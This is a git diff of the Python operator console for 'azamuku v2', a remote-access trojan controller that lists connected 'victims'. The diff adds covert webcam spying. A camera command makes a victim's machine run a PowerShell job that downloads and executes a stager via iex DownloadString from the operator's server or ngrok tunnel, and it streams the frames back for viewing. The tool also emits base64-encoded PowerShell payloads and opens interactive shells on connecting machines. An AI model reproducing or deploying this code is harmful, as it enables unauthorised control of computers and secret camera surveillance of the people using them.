@@ -10,11 +10,12 @@ import re
 import sys
 import atexit
 import base64 as _b64
+import cv2
+import numpy as np
 
 """
 written by otter - github.com/whatotter
 supported by Fan2K - github.com/Christian93111
-
 """
 
 stager = None
@@ -39,8 +40,11 @@ def getInfo():
 
         # If new connections were appended, process each one (not just the last)
         if len(s.connects) > old:
+            # snapshot the target index BEFORE the loop so new arrivals
+            # during processing don't get skipped or double-counted
+            new_old = len(s.connects)
             # process all newly appended UIDs
-            for i in range(old, len(s.connects)):
+            for i in range(old, new_old):
                 newUID = s.connects[i]
                 control = s.client(newUID)
 
@@ -120,7 +124,7 @@ def getInfo():
                 if newest == False:
                     newest = newUID
 
-            old = len(s.connects)
+            old = new_old  # use snapshot, not live len() — prevents skipping concurrent arrivals
 
         else:
             time.sleep(0.1)
@@ -131,7 +135,7 @@ def monitorConnections():
     Checks if clients have been inactive for more than the timeout period
     """
     global args
-    timeout = 15  # seconds of inactivity before considering a client disconnected
+    timeout = 45  # seconds of inactivity before considering a client disconnected
     
     while True:
         current_time = time.time()
@@ -150,19 +154,47 @@ def monitorConnections():
                 # Client has disconnected
                 if uid not in s.disconnected:
                     s.disconnected.append(uid)
-                    s.connects.remove(uid)
+                    with s._connects_lock:
+                        if uid in s.connects:
+                            s.connects.remove(uid)
                     
                     # Notify user of disconnection
                     try:
                         if uid in s.vicInfo:
                             ip_addr = s.vicInfo[uid].get('ip', 'unknown')
                             hostname = s.vicInfo[uid].get('hostname', 'unknown')
+                            print(f"\n\n[X] Connection lost: {uid} ({hostname} @ {ip_addr})\n")
+                            print("[" + coolFade("azamuku v2", (125,0,0), (125,0,0)).strip() +"]> ", end="", flush=True)
                         else:
                             print(f"\n\n[X] Connection lost: {uid}\n")
+                            print("[" + coolFade("azamuku v2", (125,0,0), (125,0,0)).strip() +"]> ", end="", flush=True)
                     except:
                         print(f"\n\n[X] Connection lost: {uid}\n")
+                        print("[" + coolFade("azamuku v2", (125,0,0), (125,0,0)).strip() +"]> ", end="", flush=True)
         time.sleep(5)  # Check every 5 seconds
+
+def remote_camera(uid):
+    """Poll the server for frames pushed by a victim and display them."""
+    filename = os.path.join(".", "core", "camera_frames", f"{uid}.jpg")
+    cv2.namedWindow(f"cam:{uid}", cv2.WINDOW_NORMAL)
+    print(f"[+] viewing remote camera for uid {uid} (press 'q' in window to exit)")
     
+    last_mod = 0
+    while True:
+        if os.path.exists(filename):
+            mod_time = os.path.getmtime(filename)
+            if mod_time != last_mod:
+                last_mod = mod_time
+                try:
+                    img = cv2.imread(filename)
+                    if img is not None:
+                        cv2.imshow(f"cam:{uid}", img)
+                except:
+                    pass
+        if cv2.waitKey(20) & 0xFF == ord('q'):
+            break
+        time.sleep(0.02)
+    cv2.destroyWindow(f"cam:{uid}")
 
 def coolFade(text, start, end):
     """
@@ -264,6 +296,7 @@ def print_payload(payload, highlights, args):
         encoded = _b64.b64encode(payload.encode('utf-16-le')).decode()
         print("[+] base64 encode:\n")
         print(f"powershell -enc {encoded}")
+
     else:
         print(highlight(payload, highlights, color=(150, 0, 0)))
 
@@ -274,6 +307,12 @@ if __name__ == '__main__':
                         "--server",
                         help="ip to bind the http(s) server to (default: 0.0.0.0)",
                         default="0.0.0.0")
+    
+    parser.add_argument("-c",
+                        "--camera",
+                        help="open camera victim laptop/pc",
+                        action="store_true",
+                        default=False)
     
     parser.add_argument("--http-port",
                         help="port to bind the http server to (default: 8080, or 0 if --https-port is set)",
@@ -438,16 +477,42 @@ if __name__ == '__main__':
                     output = output.strip()
                     
                     # Try multiple patterns for ngrok URL
-                    if 'url=' in output.lower():
-                        # Pattern: url=https://something.ngrok.io
-                        match = re.search(r'url=(https?://[^\s]+)', output, re.IGNORECASE)
-                        if match:
-                            full_url = match.group(1)
-                            # Extract just the domain part (remove http:// or https://)
-                            tunnel_url = re.sub(r'^https?://', '', full_url)
-                            print(f"[+] ngrok URL: {tunnel_url}")
-                            break
-                
+                    # Covers old/new ngrok log formats
+                    ng_match = None
+
+                    # Pattern 1: url=https://xxxx.ngrok-free.app (structured log, all versions)
+                    ng_match = re.search(r'url=(https?://[^\s"]+)', output, re.IGNORECASE)
+
+                    # Pattern 2: Forwarding https://xxxx.ngrok-free.app -> localhost (legacy console output)
+                    if not ng_match:
+                        ng_match = re.search(r'Forwarding\s+(https?://[^\s]+)', output, re.IGNORECASE)
+
+                    # Pattern 3: any bare ngrok HTTPS URL on the line
+                    if not ng_match:
+                        ng_match = re.search(r'(https://[a-zA-Z0-9\-]+\.ngrok[^\s"]*)', output, re.IGNORECASE)
+
+                    if ng_match:
+                        full_url = ng_match.group(1)
+                        tunnel_url = re.sub(r'^https?://', '', full_url)
+                        print(f"[+] ngrok URL: {tunnel_url}")
+                        break
+
+                # Fallback: query ngrok's local API if stdout parsing failed
+                if not tunnel_url:
+                    try:
+                        import urllib.request, json as _json
+                        time_module.sleep(2)  # give ngrok a moment to start
+                        api_resp = urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels", timeout=5).read()
+                        tunnels = _json.loads(api_resp).get("tunnels", [])
+                        for t in tunnels:
+                            pub = t.get("public_url", "")
+                            if pub.startswith("https://"):
+                                tunnel_url = re.sub(r'^https?://', '', pub)
+                                print(f"[+] ngrok URL (via API): {tunnel_url}")
+                                break
+                    except Exception:
+                        pass
+
                 if not tunnel_url:
                     print("\n[X] failed to get ngrok URL - check if ngrok is properly configured")
                     print("[!] you can still use azamuku, but you'll need to provide IP/port manually for payloads")
@@ -501,9 +566,12 @@ if __name__ == '__main__':
     print("       created by otter - github.com/whatotter")
     print("       supported by Fan2K - github.com/Christian93111\n")
     
-    if int(args.http_port) != 0: print("[+] started azamuku's HTTP server @ {}:{}".format(args.server, args.http_port))
-    if int(args.https_port) != 0: print("[+] started azamuku's HTTPS server @ {}:{}".format(args.server, args.https_port))
-    if tunnel_url: print("[+] tunnel URL: {}".format(tunnel_url))
+    if int(args.http_port) != 0: 
+        print("[+] started azamuku's HTTP server @ {}:{}".format(args.server, args.http_port))
+    if int(args.https_port) != 0: 
+        print("[+] started azamuku's HTTPS server @ {}:{}".format(args.server, args.https_port))
+    if tunnel_url: 
+        print("[+] tunnel URL: {}".format(tunnel_url))
     print("[+] run 'help' for a list of commands - good luck :)")
     print("") # \n
 
@@ -564,6 +632,55 @@ if __name__ == '__main__':
                 else:
                     print("[X] uid '{}' not valid - run command 'info' for a list of victims".format(uid))
 
+            elif cmd.lower() in ("camera","cam"):
+                if args.camera:
+                    if cArgs:
+                        uid = cArgs.split()[0]
+                        if uid in s.connects:
+                            try:
+                                if tunnel_url:
+                                    base_url = f"https://{tunnel_url}"
+                                else:
+                                    client_host = s.client_hosts.get(uid)
+                                    if client_host:
+                                        if 'ngrok' in client_host or 'loca.lt' in client_host:
+                                            base_url = f"https://{client_host}"
+                                        else:
+                                            protocol = "https" if int(args.https_port) != 0 else "http"
+                                            base_url = f"{protocol}://{client_host}"
+                                    else:
+                                        ip_addr = args.server if args.server != "0.0.0.0" else "127.0.0.1"
+                                        if int(args.https_port) != 0:
+                                            base_url = f"https://{ip_addr}:{args.https_port}"
+                                        else:
+                                            base_url = f"http://{ip_addr}:{args.http_port}"
+
+                                with open("./core/payloads/cam_capture.ps1", "r") as f:
+                                    cam_code = f.read()
+                                
+                                cam_code = f"$BaseUrl = '{base_url}'; $Uid = '{uid}'; $Delay = 50\n" + cam_code
+                                sid = srv.add_stager(cam_code)
+                                url = f"{base_url}/s/{sid}"
+                                
+                                print(f"[+] sending camera payload to {uid}...")
+                                victim = s.client(uid)
+                                victim.run(f"Start-Job -Name cam_{uid} -ScriptBlock {{ [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $wc = New-Object Net.WebClient; $wc.Headers.Add('ngrok-skip-browser-warning','1'); $wc.Headers.Add('Bypass-Tunnel-Reminder','1'); iex $wc.DownloadString('{url}') }}")
+                                
+                                time.sleep(1.5)
+                                remote_camera(uid)
+                                
+                                print(f"[+] stopping camera payload on {uid}...")
+                                victim.run(f"Stop-Job -Name cam_{uid}; Remove-Job -Name cam_{uid}")
+                                srv.remove_stager(sid)
+                            except Exception as e:
+                                print(f"[X] error starting remote camera: {e}")
+                        else:
+                            print(f"[X] uid '{uid}' not connected")
+                    else:
+                        print(f"[X] uid '{uid}' not connected")
+                else:
+                    print("[+] camera feed not enabled - restart with the --camera flag to use this command")
+
             elif cmd.lower() == "payload":
                 # If tunnel is active, use tunnel URL automatically
                 if tunnel_url:
@@ -576,7 +693,7 @@ if __name__ == '__main__':
                         target_payload = "localtunnel.txt"
                     
                     # we pass "443" as port just to satisfy the function signature, but it's not used in tunnel.txt/ngrok.txt
-                    payload = s.payload.generatePayload(ip, "443", target_payload)
+                    payload = s.payload.generatePayload(ip, "443", target_payload, camera_mode=args.camera)
                     print_payload(payload, [ip], args)
                     
                     # TEMPORARILY DISABLED - hotplug payload generation
@@ -595,13 +712,13 @@ if __name__ == '__main__':
 
                     if int(args.http_port) != 0:
                         port = args.http_port
-                        payload = s.payload.generatePayload(ip, port, "http.txt")
+                        payload = s.payload.generatePayload(ip, port, "http.txt", camera_mode=args.camera)
                         print("[+] HTTP payload ({}:{}):\n".format(ip, port))
                         print_payload(payload, [ip, port], args)
 
                     if int(args.https_port) != 0:
                         port = args.https_port
-                        payload = s.payload.generatePayload(ip, port, "https.txt")
+                        payload = s.payload.generatePayload(ip, port, "https.txt", camera_mode=args.camera)
                         print("[+] HTTPS payload ({}:{}):\n".format(ip, port))
                         print_payload(payload, [ip, port], args)
                 else:
@@ -620,7 +737,7 @@ if __name__ == '__main__':
                     elif args.localtunnel:
                         target_payload = "localtunnel.txt"
 
-                    payload = s.payload.generatePayload(ip, port, target_payload)
+                    payload = s.payload.generatePayload(ip, port, target_payload, camera_mode=args.camera)
                     print_payload(payload, [ip, port], args)
 
                     # TEMPORARILY DISABLED - hotplug payload generation
@@ -675,6 +792,7 @@ if __name__ == '__main__':
                     "allow": ["authorizes a uid, or a file of uids - ex: from an old payload", "allow (uid, file)"],
                     "grab": ["allows grabbing unauthorized uids connecting back to this server", "grab"],
                     "export": ["exports authorized uids for later use with allow", "export (file)"],
+                    "camera": ["takes a view of the victim's camera", "camera (uid)"],
                     "exit": ["exit the system", "exit"],
                     "quit": ["synonymous to exit", "quit"],
                     "wait": ["launches an interactive shell the moment a client connects", "wait"],
